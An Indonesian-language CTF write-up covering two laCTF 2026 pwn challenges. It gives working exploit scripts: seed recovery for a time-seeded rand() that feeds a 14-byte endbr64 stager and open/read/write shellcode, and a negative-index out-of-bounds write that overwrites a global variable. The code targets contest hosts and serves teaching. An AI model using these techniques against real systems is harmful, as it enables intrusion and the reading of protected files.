---
layout: post
title: "laCTF 2026 - Pwn"
date: 2026-02-08
image: /assets/.
categories: ["laCTF"]
tags: [pwn, ctf2026]
---

## ScrabASM

### Intro

Desc-nya: *Scrabble for ASM!*  
Tapi begitu aku lihat “tiles: 14” dan “board: `0x13370000`”, aku langsung kebayang satu hal: **ini bukan main kata, ini main shellcode**.

Twist-nya juga rapi: kita *nggak bisa* ngetik byte sesuka hati. Kita cuma dikasih 14 byte “huruf” acak, dan satu aksi: **swap** (reroll) satu tile jadi byte random berikutnya. Jadi pertanyaannya berubah dari:

> “Gimana bikin shellcode 14 byte?”  

jadi:

> “Gimana bikin RNG-nya nurut, supaya 14 byte itu tepat?”

Di write-up ini aku ceritakan dari recon sampai exploit yang nge print flag.

---

### Recon: apa aja isi folder?

Kita dapet binary + source-nya. Enak.

```bash
$ ls -la
total 44
drwxr-xr-x 2 root root  4096 Feb  7 21:25 .
drwxr-xr-x 4 root root  4096 Feb  7 21:09 ..
-rw-r--r-- 1 root root   134 Feb  4 14:20 Dockerfile
-rwxr-xr-x 1 root root 16616 Feb  7 02:09 chall
-rw-r--r-- 1 root root  2831 Feb  7 02:09 chall.c
```

`Dockerfile` juga bilang binary jalan di jail dan flag ada di `flag.txt`:

```dockerfile
FROM pwn.red/jail

COPY --from=ubuntu:noble / /srv
COPY chall /srv/app/run
COPY flag.txt /srv/app/flag.txt
RUN chmod 755 /srv/app/run
```

---

### Ngelirik binary: proteksi & “CET” yang bikin shellcode harus sopan

Pertama: tipe file dan proteksinya.

```bash
$ file chall
chall: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=b6e97f1b753083141a9f765a5582882de57e4a3d, for GNU/Linux 3.2.0, not stripped

$ checksec --file=chall
[*] '/home/hadespwnme/ctf/lactf/pwn/ScrabASM/chall'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

Poin pentingnya:

- `NX enabled` biasanya bikin shellcode sedih… **tapi** program ini nanti `mmap` halaman RWX sendiri.
- `PIE enabled` bikin alamat code random, tapi board-nya fixed: `0x13370000`.
- `IBT enabled` (bagian dari Intel CET) artinya **indirect call/jmp harus mendarat di instruksi `endbr64`**. Jadi shellcode kita harus diawali `f3 0f 1e fa`.

---

### Recon runtime: UI-nya Scrabble, mechanics-nya “byte lottery”

Jalankan binary:

```bash
$ ./chall

    .=========================================.
    |  +---+---+---+---+---+---+---+---+      |
    |  | S | c | r | a | b | A | S | M |      |
    |  | 1 | 3 | 1 | 1 | 3 | 1 | 1 | 3 |      |
    |  +---+---+---+---+---+---+---+---+      |
    |                                         |
    |   The word game where bytes are tiles   |
    |     and the board runs your code!       |
    '========================================='

    Board: 0x13370000    Tiles: 14

    Your starting tiles:
    +----+----+----+----+----+----+----+----+----+----+----+----+----+----+
    | 6f | 32 | 7f | 0f | d0 | 16 | 5e | 84 | 41 | 89 | 56 | 69 | 7f | 98 |
    +----+----+----+----+----+----+----+----+----+----+----+----+----+----+
      0    1    2    3    4    5    6    7    8    9   10   11   12   13

    1) Swap a tile
    2) Play!
```

Ada 14 tile (`HAND_SIZE=14`). Menu-nya cuma:

- swap satu tile (jadi byte random baru)
- play (jalankan 14 byte itu sebagai code)

Kalau ini “game”, berarti kita lagi main **probability**.

---

### Baca source: board beneran nge-run bytes kita

Bagian kunci ada di `swap_tile()` dan `play()`:

```c
// chall.c

#define HAND_SIZE 14
#define BOARD_ADDR 0x13370000UL
#define BOARD_SIZE 0x1000

void swap_tile(unsigned char *hand) {
    ...
    hand[idx] = rand() & 0xFF;   // <- ini satu-satunya cara kita “ngubah” byte
    puts("    Tile swapped!");
}

void play(unsigned char *hand) {
    void *board = mmap((void *)BOARD_ADDR, BOARD_SIZE,
                       PROT_READ | PROT_WRITE | PROT_EXEC,
                       MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
    ...
    memcpy(board, hand, HAND_SIZE);     // <- copy 14 byte
    ((void (*)(void))board)();          // <- execute
}

int main() {
    ...
    srand(time(NULL));                  // <- seed time-based
    for (int i = 0; i < HAND_SIZE; i++)
        hand[i] = rand() & 0xFF;        // <- starting hand dari RNG juga
    ...
}
```

Kalimatnya sederhana: **starting hand dan setiap swap sama-sama berasal dari `rand()`**, dan seed-nya cuma `time(NULL)`.

Berarti kalau kita bisa nebak seed… kita bisa “lihat masa depan” byte-byte yang bakal keluar.

---

### Bonus: bukti di ASM kalau board dipanggil via indirect call

`objdump` buat fungsi `play()`:

```bash
$ objdump -d -M intel chall | sed -n '/<play>:/,/^$/p' | head -n 35
0000000000001588 <play>:
    1588:	f3 0f 1e fa          	endbr64
    ...
    15b3:	bf 00 00 37 13       	mov    edi,0x13370000
    15b8:	e8 53 fb ff ff       	call   1110 <mmap@plt>
    ...
    1625:	ba 0e 00 00 00       	mov    edx,0xe
    1630:	e8 2b fb ff ff       	call   1160 <memcpy@plt>
    1635:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
    1639:	ff d0                	call   rax
```

Yang penting di sini:

- Mapping selalu di `0x13370000` (MAP_FIXED).
- Eksekusi terjadi lewat `call rax` (indirect call) → **IBT aktif** → shellcode *wajib* mulai dengan `endbr64`.

---

### Inti exploit: “swap” itu bukan random kalau RNG-nya bisa diprediksi

Problem real-nya bukan “ada RWX, tinggal shellcode”, karena kita cuma boleh punya **14 byte** dan itu pun awalnya random.

Jadi kita bikin exploit 2 tahap:

1) **Stage0 (14 byte)**: stager super kecil yang cuma melakukan `read(0, board, 0x80)`.
2) **Stage2 (~< 0x80 byte)**: shellcode normal (ORW) untuk buka `flag.txt`, read, write ke stdout.

Tapi supaya Stage0 bisa “terspell” di hand kita, kita harus:

- recover seed `time(NULL)` dari starting hand yang diprint,
- prediksi urutan `rand() & 0xff` berikutnya,
- dan memilih index mana yang di-swap tiap kali, supaya output RNG itu “mendarat” di posisi byte yang kita butuhkan.

---

### Stage0: 14 byte yang cuma `read()` (dan harus `endbr64`)

Kita butuh stager 14 byte. Ini byte sequence yang aku pakai:

```text
f3 0f 1e fa  89 c6  31 ff  b2 80  31 c0  0f 05
```

Disassembly-nya:

```python
from pwn import context, disasm
context.arch='amd64'
stage0 = bytes.fromhex('f3 0f 1e fa 89 c6 31 ff b2 80 31 c0 0f 05')
print(disasm(stage0))
# Output:
   0:   f3 0f 1e fa             endbr64
   4:   89 c6                   mov    esi, eax
   6:   31 ff                   xor    edi, edi
   8:   b2 80                   mov    dl, 0x80
   a:   31 c0                   xor    eax, eax
   c:   0f 05                   syscall
```

Penjelasan “kenapa ini bisa”:

- Saat `play()` memanggil board, register `RAX` berisi alamat fungsi yang dipanggil (`0x13370000`). Itu karena instruksinya `call rax`.
- `mov esi, eax` meng-copy low 32-bit `RAX` ke `RSI` → jadi `RSI = 0x13370000`.
- `xor edi, edi` → `RDI = 0` (stdin).
- `xor eax, eax` → syscall number `read` (SYS_read = 0).
- `syscall` → baca stage2 ke board.

Catatan kecil: `mov dl, 0x80` cuma set low byte `RDX`. Di environment ini cukup (upper bits kebetulan 0), jadi length efektif jadi `0x80`.

---

### Stage2: ORW buat print `flag.txt`

Setelah stage0 melakukan `read()`, eksekusi lanjut “jatuh” ke offset setelah stage0, jadi stage2 kita taruh mulai byte ke-14.

Stage2-nya (Intel syntax) seperti ini:

```asm
; ORW shellcode: openat("flag.txt"), read, write, exit
; - openat(AT_FDCWD=-100, "flag.txt", O_RDONLY=0)
; - read(fd, rsp, 0x100)
; - write(1, rsp, n)

    push -100
    pop  rdi                 ; rdi = AT_FDCWD
    lea  rsi, [rip+path]     ; rsi = &"flag.txt"
    xor  edx, edx            ; rdx = O_RDONLY
    mov  eax, 257            ; rax = SYS_openat
    syscall

    mov  edi, eax            ; rdi = fd
    mov  rsi, rsp            ; rsi = buf
    mov  edx, 0x100          ; rdx = size
    xor  eax, eax            ; rax = SYS_read
    syscall

    mov  edx, eax            ; rdx = bytes_read
    push 1
    pop  rdi                 ; rdi = stdout
    mov  eax, 1              ; rax = SYS_write
    syscall

    xor  edi, edi
    mov  eax, 60             ; SYS_exit
    syscall

path:
    .ascii "flag.txt\0"
```

Kenapa ORW (bukan `system("/bin/sh")`)?

- Di jail pwn.red, yang paling stabil biasanya langsung **open/read/write** file flag.
- Nggak perlu bergantung pada libc address / ROP (kita udah punya RWX page).

---

### Menjinakkan RNG: recover `time(NULL)` seed dari starting hand

Karena program:

```c
srand(time(NULL));
for i in 0..13:
    hand[i] = rand() & 0xff;
```

maka starting hand yang diprint itu *fingerprint* seed.

Trik yang kupakai:

1) Parse 14 byte hand dari banner.
2) Brute-force seed di sekitar waktu sekarang (mis. +/- 2 hari).
3) Untuk tiap kandidat seed, generate 14 byte pertama `rand() & 0xff` dan cocokin.

Kalau match → seed ketemu → kita bisa prediksi byte selanjutnya tanpa harus nunggu “keberuntungan”.

---

### Solver: script yang mengubah “Scrabble” jadi “Shellcode”


Cara pakai:

```bash
$ python3 solve.py --remote

lactf{gg_y0u_sp3ll3d_sh3llc0d3}
```

Full code ada di bawah ini:

```python
#!/usr/bin/env python3
"""
ScrabASM (LACTF) solver.

Idea:
- The program seeds glibc `rand()` with `time(NULL)` and prints 14 random bytes (your hand).
- You may "swap" a tile, which replaces one chosen index with the next `rand() & 0xff` byte.
- When you press Play, the 14 bytes are copied to an RWX mapping at 0x13370000 and executed.

Exploit:
1) Recover the `time(NULL)` seed by brute-forcing near current time until the first 14 bytes match.
2) Reproduce the full future RNG stream to plan swaps that sculpt the 14-byte hand into a tiny stager.
3) The 14-byte stager does `read(0, 0x13370000, 0x80)` to load a bigger stage2 shellcode.
4) Stage2 uses ORW (openat/read/write) to print `flag.txt`.
"""

import re
import time

from pwn import asm, context, remote, process


context.update(arch="amd64", os="linux")


HAND_SIZE = 14


class GlibcRand:
    """
    Minimal clone of glibc's non-reentrant `random()` generator used by `rand()`.

    glibc's `rand()` is effectively:
      (int) __random()   // returns 31-bit value
    and the state update is an additive feedback generator with degree 31 / separation 3.

    We only need it to be byte-perfect for:
      rand() & 0xff
    """

    DEG = 31
    SEP = 3
    MOD = 2147483647
    MUL = 16807

    def __init__(self, seed: int):
        # This matches the initialization logic glibc uses for its TYPE_3 generator.
        if seed == 0:
            seed = 1
        self.state = [0] * self.DEG
        self.state[0] = seed
        for i in range(1, self.DEG):
            self.state[i] = (self.MUL * self.state[i - 1]) % self.MOD
        self.f = self.SEP
        self.r = 0
        for _ in range(10 * self.DEG):
            self.rand()

    def rand(self) -> int:
        # state[f] = state[f] + state[r]
        # return state[f] >> 1
        val = (self.state[self.f] + self.state[self.r]) & 0xFFFFFFFF
        self.state[self.f] = val
        res = (val >> 1) & 0x7FFFFFFF
        self.f += 1
        self.r += 1
        if self.f >= self.DEG:
            self.f = 0
        if self.r >= self.DEG:
            self.r = 0
        return res


def parse_hand(banner: bytes) -> list[int]:
    # The hand is printed as: `| xx | yy | ... |` for 14 bytes.
    m = re.search(rb"\|\s*([0-9a-f]{2})\s*\|(?:\s*([0-9a-f]{2})\s*\|){13}", banner)
    if not m:
        raise ValueError("failed to find hand bytes in banner")
    # Extract all hex bytes between | ... |
    hexes = re.findall(rb"\|\s*([0-9a-f]{2})\s*", banner)
    if len(hexes) < HAND_SIZE:
        raise ValueError(f"expected {HAND_SIZE} bytes, got {len(hexes)}")
    return [int(x, 16) for x in hexes[:HAND_SIZE]]


def recover_seed(hand: list[int], now: int, window: int = 172800) -> int:
    # Brute-force `srand(time(NULL))` within +/- `window` seconds.
    want = bytes(hand)
    for seed in range(now - window, now + window + 1):
        r = GlibcRand(seed)
        got = bytes((r.rand() & 0xFF) for _ in range(HAND_SIZE))
        if got == want:
            return seed
    raise ValueError("seed not found in window; expand window")


def plan_swaps(seed: int, initial_hand: list[int], target: bytes, max_swaps: int = 20000) -> list[int]:
    """
    Given the RNG seed and the starting hand, compute which tile index to swap each turn
    so that the final 14 bytes equal `target`.

    Each swap consumes exactly one RNG byte: new_byte = rand() & 0xff.
    We can choose WHICH index receives that new_byte.

    Strategy:
    - Track which target bytes are still missing (byte -> list of indices needing it).
    - Maintain one "trash" index we don't care about for wasting RNG outputs.
    - For each RNG byte:
        - If it matches a needed target byte, assign it to one of the indices needing it.
        - Otherwise, assign it to the trash index.
    """
    r = GlibcRand(seed)
    # Consume RNG calls used for the initial hand.
    for _ in range(HAND_SIZE):
        r.rand()

    hand = initial_hand[:]
    remaining: dict[int, list[int]] = {}
    for i in range(HAND_SIZE):
        if hand[i] == target[i]:
            continue
        remaining.setdefault(target[i], []).append(i)

    if not remaining:
        return []

    def pick_trash() -> int:
        for idxs in remaining.values():
            if idxs:
                return idxs[-1]
        raise RuntimeError("no remaining indices")

    trash = pick_trash()
    actions: list[int] = []

    for _ in range(max_swaps):
        b = r.rand() & 0xFF
        idxs = remaining.get(b)
        if idxs:
            idx = idxs.pop()
            fixed_this = True
            if not idxs:
                del remaining[b]
        else:
            idx = trash
            fixed_this = False

        hand[idx] = b
        actions.append(idx)

        if fixed_this and idx == trash and remaining:
            trash = pick_trash()

        if not remaining:
            return actions

    raise ValueError("too many swaps; increase max_swaps")


def build_stage2() -> bytes:
    # Stage0 is 14 bytes, so execution resumes at offset 14 after the stager `read()`.
    # We send 0x80 bytes total, and place stage2 at +14 (first 14 bytes are NOPs).
    stage2 = asm(
        r"""
        .intel_syntax noprefix

        push -100
        pop rdi                 /* AT_FDCWD */
        lea rsi, [rip+path]
        xor edx, edx            /* O_RDONLY */
        mov eax, 257            /* SYS_openat */
        syscall

        mov edi, eax            /* fd */
        mov rsi, rsp
        mov edx, 0x100
        xor eax, eax            /* SYS_read */
        syscall

        mov edx, eax            /* count */
        push 1
        pop rdi
        mov eax, 1              /* SYS_write */
        syscall

        xor edi, edi
        mov eax, 60             /* SYS_exit */
        syscall

        path:
        .ascii "flag.txt\0"
        """
    )
    blob = b"\x90" * HAND_SIZE + stage2
    if len(blob) > 0x80:
        raise ValueError(f"stage2 too large for stager read: {len(blob)} > 0x80")
    return blob.ljust(0x80, b"\x90")


def main():
    import argparse

    ap = argparse.ArgumentParser()
    ap.add_argument("--remote", action="store_true")
    ap.add_argument("--host", default="chall.lac.tf")
    ap.add_argument("--port", type=int, default=31338)
    args = ap.parse_args()

    if args.remote:
        io = remote(args.host, args.port)
    else:
        io = process(["./chall"])

    # 1) Parse the printed starting hand.
    banner = io.recvuntil(b"> ")
    hand = parse_hand(banner)

    # 2) Recover the time-based seed and predict future RNG bytes.
    now = int(time.time())
    seed = recover_seed(hand, now)

    # 3) Build a 14-byte stage0 stager (must start with ENDBR64 due to IBT).
    #
    # At the moment the board is called, RAX == 0x13370000 (the function pointer itself).
    # We reuse it to set RSI = board and do a `read()` syscall.
    #
    # Stage0 bytes:
    #   f3 0f 1e fa    endbr64
    #   89 c6          mov esi, eax    ; rsi = 0x13370000
    #   31 ff          xor edi, edi    ; rdi = 0
    #   b2 80          mov dl, 0x80    ; rdx ~= 0x80 (good enough in this env)
    #   31 c0          xor eax, eax    ; rax = SYS_read
    #   0f 05          syscall
    target = bytes.fromhex("f3 0f 1e fa 89 c6 31 ff b2 80 31 c0 0f 05")
    swaps = plan_swaps(seed, hand, target)

    # 4) Send swap commands to sculpt the hand, then press Play.
    payload = b""
    for idx in swaps:
        payload += b"1\n" + str(idx).encode() + b"\n"
    payload += b"2\n"

    io.send(payload)
    io.recvuntil(b"TRIPLE WORD SCORE!")

    # 5) Stage0 executes and immediately reads stage2 from stdin.
    io.send(build_stage2())
    out = io.recvrepeat(2.0)
    print(out.decode(errors="replace"))


if __name__ == "__main__":
    main()
```


### Flag

`lactf{gg_y0u_sp3ll3d_sh3llc0d3}`

---

## tic-tac-no

### Intro

Katanya tic-tac-toe kalau dimainkan sempurna itu selalu draw. Jadi ketika challenge ini bilang, *“Can you be more perfect than my perfect bot?”*, insting pertama mestinya: “EZ”

Tapi ini CTF pwn. Jadi kita nggak perlu lebih pintar dari minimax—kita cuma perlu lebih **jahat** dari C.

Targetnya simpel:

- kalau kita menang (`winner == player`), program bakal buka `flag.txt` dan nge-print flag.
- kalau draw / kalah, kita cuma dapat “Nice try”.

Dan di sini, “menang” itu bukan soal strategi… tapi soal **nulis byte ke alamat yang salah**.

---

### Recon: apa aja isi challenge?

Lihat isi folder:

```bash
$ ls
Dockerfile
chall
chall.c
```

Ada binary `chall` dan source `chall.c` (enak: kita bisa audit cepat).

Jalankan recon klasik untuk lihat tipe file + proteksi:

```bash
$ file chall
chall: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=7af0424894612d9b72f91f4435605cb473c32b48, for GNU/Linux 3.2.0, not stripped

$ checksec --file=chall
[*] '/home/hadespwnme/ctf/lactf/pwn/tic-tac-no/chall'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
```

Catatan penting buat pembaca yang masih belajar:

- **PIE enabled**: alamat runtime bakal di-random (ASLR), tapi *offset antar simbol di binary tetap sama*.
- **No canary**: stack overflow jadi lebih mudah, tapi… kita bahkan nggak butuh overflow.
- **NX enabled**: shellcode injection susah, tapi di sini exploitnya “logic + memory bug” doang.

---

### Ngelirik source: “harusnya aman” yang ternyata kebalik

Inti interaksi user ada di `playerMove()`:

```c
void playerMove() {
   int x, y;
   do{
      printf("Enter row #(1-3): ");
      scanf("%d", &x);
      printf("Enter column #(1-3): ");
      scanf("%d", &y);
      int index = (x-1)*3+(y-1);
      if(index >= 0 && index < 9 && board[index] != ' '){
         printf("Invalid move.\n");
      }else{
         board[index] = player; // Should be safe, given that the user cannot overwrite tiles on the board
         break;
      }
   }while(1);
}
```

Kalimat komentarnya “pede banget”: *Should be safe… user cannot overwrite tiles…*

Masalahnya: `if`-nya cuma nolak **kasus sempit**:

> “index valid dan tile sudah terisi”

Sedangkan kasus yang harusnya ditolak justru ini:

- index **di luar** 0..8 (negatif atau >8)
- index valid tapi tile **kosong** (ini justru valid move)

Karena logikanya kebalik, input aneh kayak `x = -7` itu jatuh ke `else`… dan program tetap melakukan:

> `board[index] = player;`

Kalau `index` negatif → itu bukan “board”, itu “memori sebelum board”.

---

### Bonus: kenapa ini benar-benar OOB write

Kadang source bisa menipu (atau kita pengen yakin di binary beneran ada bug yang sama). Jadi kita intip disassembly `playerMove`:

```bash
$ objdump -d -M intel chall | sed -n '/14a9:/,/14f9:/p'
    14a9:	89 45 fc             	mov    DWORD PTR [rbp-0x4],eax
    14ac:	83 7d fc 00          	cmp    DWORD PTR [rbp-0x4],0x0
    14b0:	78 2e                	js     14e0 <playerMove+0xb1>
    14b2:	83 7d fc 08          	cmp    DWORD PTR [rbp-0x4],0x8
    14b6:	7f 28                	jg     14e0 <playerMove+0xb1>
    14b8:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
    14bb:	48 98                	cdqe
    14bd:	48 8d 15 a4 2b 00 00 	lea    rdx,[rip+0x2ba4]        # 4068 <board>
    14c4:	0f b6 04 10          	movzx  eax,BYTE PTR [rax+rdx*1]
    14c8:	3c 20                	cmp    al,0x20
    14ca:	74 14                	je     14e0 <playerMove+0xb1>
    14cc:	48 8d 05 31 0c 00 00 	lea    rax,[rip+0xc31]        # 2104 <_IO_stdin_used+0x104>
    14d3:	48 89 c7             	mov    rdi,rax
    14d6:	e8 65 fb ff ff       	call   1040 <puts@plt>
    14db:	e9 57 ff ff ff       	jmp    1437 <playerMove+0x8>
    14e0:	0f b6 15 69 2b 00 00 	movzx  edx,BYTE PTR [rip+0x2b69]        # 4050 <player>
    14e7:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
    14ea:	48 98                	cdqe
    14ec:	48 8d 0d 75 2b 00 00 	lea    rcx,[rip+0x2b75]        # 4068 <board>
    14f3:	88 14 08             	mov    BYTE PTR [rax+rcx*1],dl
    14f6:	90                   	nop
    14f7:	90                   	nop
    14f8:	c9                   	leave
    14f9:	c3                   	ret
```

Di sini keliatan jelas:

- kalau `index < 0` (`js`) atau `index > 8` (`jg`) → lompat ke label `14e0` yang justru **ngelakuin write**.

#### Pseudocode hasil “translate” dari ASM

kira-kira begini:

```text
index = (x-1)*3 + (y-1)

if (index in [0..8] AND board[index] != ' '):
    print("Invalid move")
    retry
else:
    board[index] = player    // <- ini termasuk index negatif / >8 (OOB!)
    return
```

Itu bukan “bug kecil”. Itu primitif:

> **arbitrary out-of-bounds byte write** (dekat area global).

---

### Inti exploit: nembak variabel global `computer` pakai index negatif

Karena `board` adalah global array, menulis `board[index]` itu sebenarnya:

> tulis 1 byte ke alamat `&board[0] + index`

Kita butuh tahu: *ada apa sebelum `board`?*

Cek simbol global:

```bash
$ nm -n chall | egrep ' player$| computer$| board$'
0000000000004050 D player
0000000000004051 D computer
0000000000004068 B board
```

Artinya (ingat: ini offset PIE, bukan alamat runtime absolut):

- `player` ada di `0x4050` (byte `'X'`)
- `computer` ada di `0x4051` (byte `'O'`)
- `board` mulai di `0x4068` (9 byte)

Selisih yang kita incar:

```text
index_target = &computer - &board
             = 0x4051 - 0x4068
             = -0x17
             = -23
```

Jadi kalau kita bikin `index = -23`, statement `board[index] = player` bakal berubah menjadi:

> `computer = 'X'`

Dan begitu `computer` jadi `'X'`, bot yang “sempurna” itu… mendadak main pakai simbol kita juga.

#### Mengubah `index` jadi (row, col)

Program menghitung:

```text
index = (row-1)*3 + (col-1)
```

Kita mau `index = -23`.

Pilih:

- `row = -7` → `(row-1)*3 = (-8)*3 = -24`
- `col = 2`  → `(col-1) = 1`

Maka:

```text
index = -24 + 1 = -23
```

Dan itu langsung nulis ke `computer`.

---

### Solver: minimal input, maksimal kerusakan

Kita bungkus exploit ini pakai pwntools.

```python
#!/usr/bin/env python3
import os
import re
import stat
from pwn import *


def main():
    host = args.HOST or "chall.lac.tf"
    port = int(args.PORT or 30001)

    elf = ELF("./chall", checksec=False)
    context.binary = elf
    context.log_level = args.LOG_LEVEL or "info"

    if args.LOCAL:
        st = os.stat(context.binary.path)
        if not (st.st_mode & stat.S_IXUSR):
            os.chmod(context.binary.path, st.st_mode | stat.S_IXUSR)
        io = process(context.binary.path)
    else:
        io = remote(host, port)

    # Bug: playerMove() allows out-of-bounds indices. Compute an index that
    # aliases the global `computer` char and overwrite it with `player` ('X').
    idx = elf.sym["computer"] - elf.sym["board"]  # negative
    x = idx // 3 + 1
    y = idx % 3 + 1
    io.sendlineafter(b"Enter row #(1-3): ", str(x).encode())
    io.sendlineafter(b"Enter column #(1-3): ", str(y).encode())

    # Put an X in the top-left; the bot will complete the diagonal and "we" win.
    io.sendlineafter(b"Enter row #(1-3): ", b"1")
    io.sendlineafter(b"Enter column #(1-3): ", b"1")

    if args.INTERACTIVE:
        io.interactive()
        return

    data = io.recvall(timeout=3) or b""
    m = re.search(rb"lactf\\{[^}]+\\}", data)
    if m:
        print(m.group(0).decode(errors="replace"))
    else:
        # Fallback: print last non-empty line (often the flag)
        lines = [ln for ln in data.splitlines() if ln.strip()]
        if lines:
            print(lines[-1].decode(errors="replace"))
        else:
            log.error("No output received; try INTERACTIVE=1")


if __name__ == "__main__":
    main()
```

Test remote:

```bash
$ python3 solve.py LOG_LEVEL=error
[x] Opening connection to chall.lac.tf on port 30001
[x] Opening connection to chall.lac.tf on port 30001: Trying 34.169.138.235
[+] Opening connection to chall.lac.tf on port 30001: Done
[x] Receiving all data
[x] Receiving all data: 0B
[x] Receiving all data: 173B
[+] Receiving all data: Done (173B)
[*] Closed connection to chall.lac.tf port 30001
lactf{th3_0nly_w1nn1ng_m0ve_1s_t0_p1ay}
```

### Flag

`lactf{th3_0nly_w1nn1ng_m0ve_1s_t0_p1ay}`
